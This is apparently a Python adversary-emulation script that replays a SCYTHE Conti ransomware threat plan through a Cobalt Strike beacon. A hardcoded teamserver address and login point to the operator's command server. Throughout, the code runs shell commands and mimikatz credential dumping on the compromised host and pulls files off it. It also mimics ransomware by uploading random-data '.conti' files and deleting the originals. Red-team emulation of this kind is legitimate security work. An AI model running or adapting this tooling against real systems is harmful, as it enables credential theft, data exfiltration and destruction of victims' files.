import json
import re
from payload_automation.beacon import Beacon, getNextBeacon
import random
import os
import tempfile

from shlex import split
from argparse import ArgumentParser

def loadThreat(threat_path):
    web_rex = re.compile(r'^https?:\/\/.*', re.IGNORECASE)
    if re.search(web_rex, threat_path):
        print("[!] Loading threats from web is not implemented yet")
        threat = None
    else:
        print(f"[*] Loading threat from local file: {threat_path}")
        with open(threat_path, 'r') as file:
            threat = json.loads(file.read())
        #print(threat)

    return threat

# def convertAction(action):

#     implemented_actions = ['run', 'controller', 'mimikatz', 'file', 'uploader', 'downloader', 'crypt']
#     passive_actions = ['loader', 'https']
#     unimplemented_actions = []

#     if action['module'] in unimplemented_actions:
#         print(f"[!] {action['module']} has not been implemented yet. Thank you, come again!")
#     elif action['module'] not in implemented_actions and action['module'] not in passive_actions:
#         print(f"[!] Unknown module: {action['module']}. What do you think you are up to?")

#     if action['module'] == 'run':
#         # Might want to add a check here for powershell later
#         cmdline = action['request']
#         print(f"bshell($bid, '{cmdline}');")

#     elif action['module'] == 'mimikatz':
#         arglist_rex = re.compile('.*?--arglist (.*?)$', re.IGNORECASE)
#         arglist = re.match(arglist_rex, action['request']).group(1)
#         if arglist:
#             print(f"bmimikatz($bid, '{arglist}');")

#     elif action['module'] == 'controller':
#         controller_action = action['request']
#         if controller_action == '--shutdown':
#             print("bexit($bid);")


def executeAction(beacon, action):

    implemented_actions = ['run', 'controller', 'mimikatz', 'file', 'downloader', 'crypt', "uploader"]
    passive_actions = ['loader', 'https']
    unimplemented_actions = []

    module = action['module']

    if  module in unimplemented_actions:
        print(f"[!] {module} has not been implemented yet. Thank you, come again!")
        return
    elif module not in implemented_actions and module not in passive_actions:
        print(f"[!] Unknown module: {module}. What do you think you are up to?")
        return

    if module == 'run':
        #return
        # Might want to add a check here for powershell later
        cmdline = action['request']
        print(f"[*] Running bshell($bid, '{cmdline}');")
        # Some of the commands don't return data when being run through bshell. We should turn output capture off since we don't expect output
        if cmdline.startswith("powershell ") or cmdline.startswith("cmd /c "):
            # cmdline.replace("powershell ", "")
            beacon.bshell(cmdline, output=False)
        else:
            # print(f"[*] Running bshell($bid, '{cmdline}');")
            beacon.bshell(cmdline)

    elif module == 'mimikatz':
        #return
        arglist_rex = re.compile('.*?--arglist (.*?)$', re.IGNORECASE)
        arglist = re.match(arglist_rex, action['request']).group(1)
        if arglist:
            print(f"[*] Running bmimikatz($bid, '{arglist}');")
            beacon.bmimikatz(arglist)

    elif module == 'controller':
        #return
        controller_action = action['request']
        if controller_action == '--shutdown':
            print("Since testing, not actually running, but would run bexit($bid);")


            # "20": {
            #     "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
            #     "module": "file",
            #     "request": "--create --path \"%USERPROFILE%\\Desktop\\Conti\\target_file.doc\" --size 1MB --count 100 --random",
            #     "rtags": [
            #         "att&ck-technique:T1074.001"
            #     ],
            #     "type": "message"
            # },
    elif module == 'file':
        #return
        parser = ArgumentParser()
        parser.add_argument("--create", action="store_true", help="flag to denote that we should be creating files")
        parser.add_argument("--path", help="The remote dest path location on the target host to create the file(s) in", required=True)
        parser.add_argument("--size", help="The size of the file(s) to create")
        parser.add_argument("--count", type=int, help="The number of files to create")
        parser.add_argument("--random", action="store_true", help="flag to denote that the data in each file should be random data", default=False)
        args = parser.parse_args(split(action['request']))


        if args.create:
            action = "create"
        else:
            action = None
            print("idk")

        # The path is a file name, but if the count is > 1 then we have to append ({index - 1}) to the file name right before the extension
        if args.count and args.count > 1:
            if args.count > 10:
                sleeptime = 3
                jitter = None
                beacon.bsleep(0)
                print(f"[~!*] This mofo wants to create {args.count} files! That will take up {args.count} sleep cycles! I can't do the math, but that's probably a long time for humans.")
                print( "      Switching beacon to interactive for the upload of all these damn files, then I'll switch it back when I'm done")

            for i in range(args.count):
                if i > 0:
                    filename = ".".join(args.path.split(".")[0:-1]) + f" ({i})." +  args.path.split(".")[-1]
                else:
                    filename = args.path

                SCYTHE_file(beacon, action, filename, args.size, args.random)


            if args.count > 10:
                print(f"[~!*] Switching back the sleep to {sleeptime} seconds")
                beacon.bsleep(sleeptime, jitter)

    elif module == 'downloader':
        #return
        # Downloader is roughly Cobalt Strike's bupload() command. 
        # The way SCYTHE has them setup in GitHub is the files are inside of the VFS directory, so we need to get that file name and combine that with the path to the VFS directory
        parser = ArgumentParser()
        parser.add_argument("--src", help="The local source path for the file to 'download' to the host", required=True)
        parser.add_argument("--dest", help="The remote dest path location on the target host to 'download' the file to", required=True)


        request = action['request'].replace("\\", "\\\\")
        args = parser.parse_args(split(request))

        if args.src.startswith("VFS:"):
            src = vfsPath(args.src)
        else:
            src = args.src

        dest = convertPath(beacon, args.dest)
        beacon.bupload(src, remote_path=dest)

    elif module == 'uploader':
        #return
        # Uploader is roughly Cobalt Strike's bdownload() command. 
        parser = ArgumentParser()
        parser.add_argument("--remotepath", help="The remote path for the file to 'upload' (exfil) from the host", required=True)
        args = parser.parse_args(split(action['request']))

        remotepath = convertPath(beacon, args.remotepath)
        #print(f"Downloading {remotepath}")
        beacon.bdownload(remotepath)


    elif module == 'crypt':
        #return
        # crypt doesn't exist by default in Cobalt Strike. We will emulate it with the upload and rm commands to handle "encrypt and "erase". 
        # Rather than actually encrypting, we will just upload random data
        # Later we should write a BOF that can do these things locally and we don't have to transfer file info over C2 (closer emulation to real thing)
        file_extension = "conti"

        # We would have to do some extra effort here to know the right file size to fake encrypt it, so I'm just doing a lazy random for now between 1kb and 1mb
        # later we could do an ls and get the file size, or you know... acutally encrypt the data...
        

        parser = ArgumentParser()
        parser.add_argument("--target", help="The local source path for the file to 'download' to the host", required=True)
        parser.add_argument("--encrypt", action="store_true", help="flag to denote that we should encrypt the target file")
        parser.add_argument("--decrypt", action="store_true", help="flag to denote that we should decrypt the target file")
        parser.add_argument("--password", help="password to encrypt/decrypt the file with", required=True)
        parser.add_argument("--erase", action="store_true", help="flag to denote that we should erase original file", default=False)

        #print(action['request'])
        request = action['request'].replace("\\", "\\\\")
        split_args = split(request)
        #print(split_args)
        args = parser.parse_args(split_args)

        target = convertPath(beacon, args.target)
        encrypt = args.encrypt
        decrypt = args.decrypt
        password = args.password
        erase = args.erase

        

        if encrypt and decrypt:
            print("[!] ERROR: crypt called with both --encrypt and --decrypt flags. Must choose one and only one.")
        elif encrypt:
            
            
            # 1. make random bytes of a random size
            # 2. parse file name of target, replace extension with {file_extension}
            # 3. upload raw
            # 4. if erase: rm original filename
            
            ls_output = beacon.bls(path=target).output.split('\r\n')
            #print(beacon.bls(path=target).output)

            filename_rex = re.compile(r".*\t(.*?)$")

            files = list()
            for line in ls_output:
                #print(line)
                try:
                    files.append(filename_rex.match(line).groups()[0])
                except:
                    pass

            for file in files: 
                file_size = random.randrange(1000, (1000 * 1000))
                bytes_to_upload = os.urandom(file_size)
                if file != '.' and file != '..':
                    encrypted_file = file.replace(file.split(".")[-1], file_extension)
                    encrypted_target = target + encrypted_file
                    print(f"[*] Uploading [{encrypted_target}]")
                    with tempfile.NamedTemporaryFile() as tmp:
                        tmp.write(bytes_to_upload)

                        beacon.bupload(tmp.name, remote_path=encrypted_target)
                    if erase:
                        erase_target = target + file
                        print(f"[*] Erasing original file [{erase_target}]")
                        beacon.brm(erase_target)
                        #print(f"[!] --erase not implemented yet, didn't actually remove file yet.")

        elif decrypt:
            print("[!] Decrypt isn't really implemented due to the way we aren't actually encrypting, just faking it")
        else:
            print("[!] ERROR: crypt called without --encrypt or --decrypt flag. One of those flags is required.")
        ########################## CONTINUE HERE!!! ###################################



# Modules used in SCYTHE not built into Cobalt Strike that we have to re-make ourselves


# SCYTHE_file creates a file on the system. The file is created locally then uploaded with bupload(). Below are some parameters found that need to be handled
            # "20": {
            #     "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
            #     "module": "file",
            #     "request": "--create --path \"%USERPROFILE%\\Desktop\\Conti\\target_file.doc\" --size 1MB --count 100 --random",
            #     "rtags": [
            #         "att&ck-technique:T1074.001"
            #     ],
            #     "type": "message"
            # },

# Might eventually be worth creating a BOF that replicates this, so that we don't have to upload massive files when creating random junk
def SCYTHE_file(beacon, action, path, size, random):

    # I don't currently know what the --count parameter does. I might want to ask someone at SCYTHE about that
    if "MB" in size:
        #print(size)
        size = int(size.replace("MB", "")) * (1000 * 1000)
        #rint(size)
    else:
        print(f"[!] Size of {size} is unknown. Need to update to handle this case. Don't just stand there, get to work!")
        return

    if action == "create":
        path = convertPath(beacon, path)
        print(f"[*] Creating file at {path}")
        if random:
            bytes_to_upload = os.urandom(size)
        else:
            print("[!] Oh shit, it's not random. Wasn't expecting that. Hmmm....")
            return
        with tempfile.NamedTemporaryFile() as tmp:
            tmp.write(bytes_to_upload)

            beacon.bupload(tmp.name, remote_path=path)
            #print(tmp.name)

    elif action == "delete":
        pass

    else:
        print("[!] Bad action provided to SCYTHE_file() function")
        return


# This function will make some assumptions to convert paths with ENVs in them to full paths. 
# In the future, we should add something that runs `env` bof from trustedsec and handles the conversion properly
def convertPath(beacon, path):
    path = path.replace("%USERPROFILE%", f"C:\\Users\\{beacon.metadata['user']}")
    path = path.replace("%APPDATA%", f"C:\\Users\\{beacon.metadata['user']}\\AppData\\Roaming")

    return path

def vfsPath(path):
    # Could probably add a conversion in the future based on threat_path. If it's http(s) to github, can adjust and pull the right file directly from github
    filename = path.split("/")[-1]
    path = VFS_PATH + filename
    return path

if __name__ == '__main__':
    VFS_PATH = "./community-threats/Conti/VFS/"
    threat_path = "Contiv2_scythe_threat.json"
    threat = loadThreat(threat_path)["threat"]
    name = threat["name"]
    print(f"[*] Loaded threat: {name}")

    teamserver = "18.222.180.239"
    user = "Faultline"
    password = "Password1"
    listener = "HTTPS"
    cobaltstrike_directory = "/Applications/Cobalt Strike/Cobalt Strike.app/Contents/Java"

    #beacon = Beacon('285949896', teamserver, user, password, cobaltstrike_directory)

    # Get the first beacon that comes in
    print("Waiting for our initial beacon...")
    beacon = getNextBeacon(teamserver, user, password, cobaltstrike_directory)
    #print(beacon.metadata["user"])
    #print(threat)
    # print(threat["script"])
    for action in threat["script"]:
        # print(threat["script"][action])
        if "module" in threat["script"][action]:
            executeAction(beacon, threat["script"][action])

